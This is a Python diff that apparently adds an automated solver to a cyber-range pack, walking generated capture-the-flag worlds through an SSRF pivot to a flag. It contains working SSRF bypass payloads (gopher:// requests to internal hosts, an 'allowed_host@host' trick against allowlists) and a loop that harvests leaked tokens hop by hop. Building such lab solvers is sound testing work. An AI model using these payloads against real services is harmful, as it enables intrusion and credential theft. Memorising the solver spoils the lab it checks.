@@ -20,8 +20,10 @@ here.
 from __future__ import annotations
 
 import base64
+import json
 import urllib.parse
-from collections.abc import Mapping
+from collections.abc import Callable, Mapping
+from dataclasses import dataclass
 
 from graphschema import Node, WorldGraph
 from openrange_pack_sdk import PackError
@@ -206,3 +208,83 @@ def exploit_and_benign(graph: WorldGraph, kind: str) -> tuple[str, str]:
     if kind == "broken_authz":
         return f"{ep}?{_broken_authz_query(params)}", ep
     return f"{ep}?{_weak_cred_query(params)}", ep  # weak_credentials
+
+
+@dataclass(frozen=True)
+class ChainTrace:
+    """A multi-step solve: the response the flag must leak from, plus the probes (the
+    entry leak and every no-credential request) it must not — feed both to the gate."""
+
+    terminal: str
+    probes: list[str]
+
+
+def _ssrf_public_endpoint(graph: WorldGraph, ssrf: Node) -> str:
+    public_eps = {
+        e.dst
+        for svc in graph.by_kind("service")
+        if svc.attrs.get("exposure") == "public"
+        for e in graph.out_edges(svc.id, "exposes")
+    }
+    ep_id = next(
+        iter({e.dst for e in graph.out_edges(ssrf.id, "affects")} & public_eps)
+    )
+    return str(graph.nodes[ep_id].attrs["public_url"])
+
+
+def _credleak_entry(graph: WorldGraph) -> tuple[str, str]:
+    leak = _vuln_of_kind(graph, "credential_leak")
+    ep_id = next(e.dst for e in graph.out_edges(leak.id, "affects"))
+    svc_id = next(e.src for e in graph.in_edges(ep_id, "exposes"))
+    return str(graph.nodes[svc_id].attrs["name"]), str(graph.nodes[ep_id].attrs["path"])
+
+
+def solve_chain(graph: WorldGraph, fetch: Callable[[str], str]) -> ChainTrace:
+    """Drive a multi-service pivot to the flag, using ``fetch(path) -> response body``.
+
+    Two shapes, dispatched off the SSRF params: a networked direct pivot (the public
+    SSRF reaches an internal metadata endpoint that serves the flag) and a proxy-mode
+    credential chain (each gated host hands over the next host's credential until the
+    last serves the flag). The host injects ``fetch`` so the pack stays transport-free.
+    """
+    ssrf = _vuln_of_kind(graph, "ssrf")
+    params = dict(ssrf.attrs["params"])
+    pivot_ep = _ssrf_public_endpoint(graph, ssrf)
+    param = str(params["target_param"])
+
+    def pivot(url: str) -> str:
+        return fetch(f"{pivot_ep}?{param}={urllib.parse.quote(url)}")
+
+    if "internal_hosts" in params:
+        return _walk_credential_chain(graph, pivot)
+    if "internal_path" in params:
+        return _company_pivot(params, pivot)
+    raise PackError("not a chain world: SSRF is neither proxy-mode nor networked-pivot")
+
+
+def _walk_credential_chain(
+    graph: WorldGraph, pivot: Callable[[str], str]
+) -> ChainTrace:
+    host, path = _credleak_entry(graph)
+    entry = pivot(f"gopher://{host}{path}")
+    cfg: dict[str, str] = json.loads(entry)
+    probes = [entry]  # the entry hands over a credential, never the flag
+    terminal = entry
+    while "vault_host" in cfg:
+        vhost, vpath = cfg["vault_host"], cfg["vault_path"]
+        aparam, token = cfg["auth_param"], cfg["db_token"]
+        probes.append(pivot(f"gopher://{vhost}{vpath}"))  # no credential -> denied
+        terminal = pivot(f"gopher://{vhost}{vpath}?{aparam}={token}")
+        cfg = json.loads(terminal)  # a relay hands the next hop; the flag gate ends it
+    return ChainTrace(terminal=terminal, probes=probes)
+
+
+def _company_pivot(
+    params: Mapping[str, object], pivot: Callable[[str], str]
+) -> ChainTrace:
+    host, internal_path = params["internal_host"], params["internal_path"]
+    if params.get("ssrf_filter") == "scheme_block":
+        payload = f"gopher://{host}{internal_path}"
+    else:  # host_allowlist (a hostname target swaps decimal_ip to it)
+        payload = f"http://{params.get('allowed_host', 'ok')}@{host}{internal_path}"
+    return ChainTrace(terminal=pivot(payload), probes=[pivot("gopher://example.com/")])
